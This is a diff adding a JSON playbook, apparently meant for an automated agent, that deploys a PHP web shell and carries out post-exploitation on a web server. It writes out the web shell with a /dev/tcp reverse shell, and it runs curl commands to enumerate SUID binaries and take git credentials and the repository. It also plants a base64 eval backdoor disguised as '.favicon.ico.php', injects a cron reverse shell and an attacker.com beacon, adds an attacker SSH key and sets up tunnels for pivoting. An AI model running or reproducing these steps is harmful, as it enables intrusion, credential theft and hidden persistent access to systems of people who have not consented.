@@ -1,0 +1,127 @@
+{
+  "name": "webshell_post_exploitation",
+  "description": "Web shell deployment and post-exploitation techniques for persistent access",
+  "pattern": "web.*shell|post.*exploitation|persistence|backdoor",
+  "parameters": [
+    "shell_url",
+    "target_system",
+    "persistence_method"
+  ],
+  "sequence": [
+    {
+      "action": {
+        "type": "system_command",
+        "tool": "shell",
+        "operation": "run",
+        "command": "bash",
+        "args": [
+          "-c",
+          "cat > p0wny-shell.php << 'EOF'\n<?php\n$SHELL = \"bash -i >& /dev/tcp/10.10.14.50/4444 0>&1\";\nif(isset($_GET['cmd'])) {\n    echo \"<pre>\" . shell_exec($_GET['cmd']) . \"</pre>\";\n} elseif(isset($_GET['rev'])) {\n    shell_exec($SHELL);\n    echo \"Reverse shell initiated\";\n} else {\n    echo \"p0wny@shell:~$ Ready\";\n}\n?>\nEOF\ncat p0wny-shell.php"
+        ]
+      },
+      "expected_output": {
+        "type": "string",
+        "example": "<?php\n$SHELL = \"bash -i >& /dev/tcp/10.10.14.50/4444 0>&1\";\nif(isset($_GET['cmd'])) {\n    echo \"<pre>\" . shell_exec($_GET['cmd']) . \"</pre>\";\n} elseif(isset($_GET['rev'])) {\n    shell_exec($SHELL);\n    echo \"Reverse shell initiated\";\n} else {\n    echo \"p0wny@shell:~$ Ready\";\n}\n?>\n\nWeb shell created: p0wny-shell.php\n  Features:\n    - Command execution via ?cmd= parameter\n    - Reverse shell via ?rev parameter\n    - Lightweight (minimal detection)\n  \nUsage:\n  1. Upload via file upload vulnerability\n  2. Access: http://target.com/uploads/p0wny-shell.php\n  3. Execute commands: ?cmd=whoami\n  4. Get reverse shell: ?rev=1\n  \nUpload methods:\n  - File upload form\n  - WebDAV PUT\n  - FTP (if accessible)\n  - Remote file inclusion\n  - Log poisoning"
+      }
+    },
+    {
+      "action": {
+        "type": "system_command",
+        "tool": "shell",
+        "operation": "run",
+        "command": "curl",
+        "args": [
+          "http://target.com/uploads/p0wny-shell.php?cmd=whoami"
+        ]
+      },
+      "expected_output": {
+        "type": "string",
+        "example": "p0wny@shell:~$ Ready\n<pre>www-data</pre>\n\nWeb shell active!\n  URL: http://target.com/uploads/p0wny-shell.php\n  User: www-data\n  Command executed: whoami\n  Output: www-data\n  \nShell operational and accepting commands"
+      }
+    },
+    {
+      "action": {
+        "type": "system_command",
+        "tool": "shell",
+        "operation": "run",
+        "command": "curl",
+        "args": [
+          "http://target.com/uploads/p0wny-shell.php?cmd=find%20/%20-perm%20-4000%202%3E/dev/null"
+        ]
+      },
+      "expected_output": {
+        "type": "string",
+        "example": "<pre>\n/usr/bin/passwd\n/usr/bin/gpasswd\n/usr/bin/chsh\n/usr/bin/chfn\n/usr/bin/sudo\n/usr/bin/newgrp\n/usr/bin/su\n/usr/bin/mount\n/usr/bin/umount\n/usr/bin/fusermount\n/usr/lib/dbus-1.0/dbus-daemon-launch-helper\n/usr/lib/openssh/ssh-keysign\n/usr/lib/eject/dmcrypt-get-device\n/usr/lib/policykit-1/polkit-agent-helper-1\n/usr/local/bin/backup_script\n/opt/monitoring/check_status\n</pre>\n\nSUID binary enumeration:\n  Command: find / -perm -4000 2>/dev/null\n  Purpose: Find SUID binaries for privilege escalation\n  \nStandard SUID binaries:\n  - /usr/bin/passwd\n  - /usr/bin/sudo\n  - /usr/bin/su\n  - /usr/bin/mount\n  \nNon-standard SUID binaries (escalation candidates):\n  - /usr/local/bin/backup_script (custom script)\n  - /opt/monitoring/check_status (monitoring tool)\n  \nNext: Analyze custom SUID binaries\n  curl 'http://target.com/uploads/p0wny-shell.php?cmd=file%20/usr/local/bin/backup_script'\n  curl 'http://target.com/uploads/p0wny-shell.php?cmd=strings%20/usr/local/bin/backup_script'"
+      }
+    },
+    {
+      "action": {
+        "type": "system_command",
+        "tool": "shell",
+        "operation": "run",
+        "command": "curl",
+        "args": [
+          "http://target.com/uploads/p0wny-shell.php?cmd=cat%20/var/www/html/.git/config"
+        ]
+      },
+      "expected_output": {
+        "type": "string",
+        "example": "<pre>\n[core]\n        repositoryformatversion = 0\n        filemode = true\n        bare = false\n        logallrefupdates = true\n[remote \"origin\"]\n        url = https://gitlab.company.com/webteam/shop-application.git\n        fetch = +refs/heads/*:refs/remotes/origin/*\n[branch \"master\"]\n        remote = origin\n        merge = refs/heads/master\n[user]\n        name = John Developer\n        email = john.developer@company.com\n[credential]\n        helper = store\n</pre>\n\nGit repository discovered!\n  Location: /var/www/html/.git\n  Remote: https://gitlab.company.com/webteam/shop-application.git\n  Credential helper: store (credentials cached)\n  \nExfiltrate entire repository:\n  curl 'http://target.com/uploads/p0wny-shell.php?cmd=tar%20czf%20/tmp/git.tar.gz%20/var/www/html/.git'\n  curl http://target.com/tmp/git.tar.gz -o git.tar.gz\n  \nExtract git credentials:\n  curl 'http://target.com/uploads/p0wny-shell.php?cmd=cat%20/home/www-data/.git-credentials'\n  \nPotential findings:\n  - Git commit history (leaked secrets)\n  - Developer credentials\n  - API keys in old commits\n  - Internal URLs and infrastructure"
+      }
+    },
+    {
+      "action": {
+        "type": "system_command",
+        "tool": "shell",
+        "operation": "run",
+        "command": "bash",
+        "args": [
+          "-c",
+          "# Create persistence backdoor\ncat > backdoor.php << 'EOF'\n<?php\n@eval(base64_decode($_POST['cmd']));\n?>\nEOF\n\n# Obfuscate filename\nBACKDOOR_NAME=\".favicon.ico.php\"\necho \"Backdoor filename: $BACKDOOR_NAME\"\n\n# Upload backdoor\ncurl http://target.com/uploads/p0wny-shell.php \\\n  --data-urlencode 'cmd=echo \"<?php @eval(base64_decode($_POST[\\\"cmd\\\"])); ?>\" > /var/www/html/.favicon.ico.php'\n\necho \"\"\necho \"Testing backdoor...\"\n# Test backdoor\nCMD_B64=$(echo 'system(\"whoami\");' | base64)\ncurl -X POST http://target.com/.favicon.ico.php -d \"cmd=$CMD_B64\""
+        ]
+      },
+      "expected_output": {
+        "type": "string",
+        "example": "Backdoor filename: .favicon.ico.php\n\n<pre></pre>\n\nTesting backdoor...\nwww-data\n\nPersistence backdoor deployed!\n  Filename: .favicon.ico.php (hidden file, looks innocent)\n  Location: /var/www/html/.favicon.ico.php\n  URL: http://target.com/.favicon.ico.php\n  \nBackdoor features:\n  - Base64 encoded commands (bypass WAF)\n  - POST-based (not logged in URL)\n  - eval() execution (arbitrary PHP)\n  - Hidden filename (. prefix)\n  - Innocent-looking name (favicon.ico)\n  \nUsage:\n  # Base64 encode PHP command\n  echo 'system(\"id\");' | base64\n  # Result: c3lzdGVtKCJpZCIpOwo=\n  \n  # Execute via POST\n  curl -X POST http://target.com/.favicon.ico.php \\\n    -d 'cmd=c3lzdGVtKCJpZCIpOwo='\n  \nPersistence advantages:\n  - Survives web shell cleanup\n  - Hidden from casual inspection\n  - No obvious backdoor indicators\n  - WAF bypass via encoding"
+      }
+    },
+    {
+      "action": {
+        "type": "system_command",
+        "tool": "shell",
+        "operation": "run",
+        "command": "curl",
+        "args": [
+          "http://target.com/uploads/p0wny-shell.php?cmd=crontab%20-l"
+        ]
+      },
+      "expected_output": {
+        "type": "string",
+        "example": "<pre>\n# Edit this file to introduce tasks to be run by cron.\n# \n# m h  dom mon dow   command\n*/5 * * * * /usr/local/bin/backup.sh > /dev/null 2>&1\n0 2 * * * /opt/cleanup/clean_temp.sh\n0 */6 * * * curl https://monitoring.company.com/heartbeat?server=web-01\n</pre>\n\nCrontab enumerated:\n  User: www-data\n  Scheduled tasks: 3\n  \nCron jobs:\n  1. Every 5 minutes: /usr/local/bin/backup.sh\n  2. Daily 2 AM: /opt/cleanup/clean_temp.sh\n  3. Every 6 hours: Heartbeat to monitoring server\n  \nPersistence via cron:\n  # Check if backup.sh is writable\n  curl 'http://target.com/uploads/p0wny-shell.php?cmd=ls%20-la%20/usr/local/bin/backup.sh'\n  \nIf writable, inject reverse shell:\n  echo 'bash -i >& /dev/tcp/10.10.14.50/4444 0>&1' >> /usr/local/bin/backup.sh\n  \nAlternative: Add own cron job\n  (echo '*/10 * * * * curl http://attacker.com/beacon?host=$(hostname)') | crontab -"
+      }
+    },
+    {
+      "action": {
+        "type": "system_command",
+        "tool": "shell",
+        "operation": "run",
+        "command": "bash",
+        "args": [
+          "-c",
+          "# Create SSH backdoor\nSSH_KEY='ssh-rsa AAAAB3NzaC1yc2EAAAADAQABAAABAQC... attacker@kali'\n\n# Add SSH key to www-data authorized_keys\ncurl \"http://target.com/uploads/p0wny-shell.php\" \\\n  --data-urlencode \"cmd=mkdir -p /var/www/.ssh && echo '$SSH_KEY' >> /var/www/.ssh/authorized_keys && chmod 700 /var/www/.ssh && chmod 600 /var/www/.ssh/authorized_keys\"\n\necho \"\"\necho \"Testing SSH access...\"\n# Test SSH connection\nssh -i ~/.ssh/id_rsa www-data@target.com -o StrictHostKeyChecking=no 'whoami; id'"
+        ]
+      },
+      "expected_output": {
+        "type": "string",
+        "example": "<pre></pre>\n\nTesting SSH access...\nwww-data\nuid=33(www-data) gid=33(www-data) groups=33(www-data)\n\nSSH backdoor established!\n  User: www-data\n  SSH key: Attacker's public key added to authorized_keys\n  Access method: SSH with private key\n  \nPersistence via SSH:\n  Connection: ssh -i ~/.ssh/id_rsa www-data@target.com\n  \nAdvantages:\n  - Encrypted communication (SSH)\n  - No web shell needed\n  - Appears as legitimate SSH traffic\n  - Survives web application updates\n  - Can use SSH tunneling for pivoting\n  \nSSH tunneling for pivot:\n  # Local port forward (access internal services)\n  ssh -i ~/.ssh/id_rsa -L 3306:localhost:3306 www-data@target.com\n  \n  # Dynamic port forward (SOCKS proxy)\n  ssh -i ~/.ssh/id_rsa -D 9050 www-data@target.com\n  proxychains nmap 10.10.10.0/24\n  \n  # Remote port forward (expose attacker service)\n  ssh -i ~/.ssh/id_rsa -R 8080:attacker.com:80 www-data@target.com"
+      }
+    }
+  ],
+  "stats": {
+    "uses": 0,
+    "successes": 0,
+    "failures": 0,
+    "success_rate": 0.0
+  },
+  "created_by": "neural_mesh_v5.2_generator"
+}
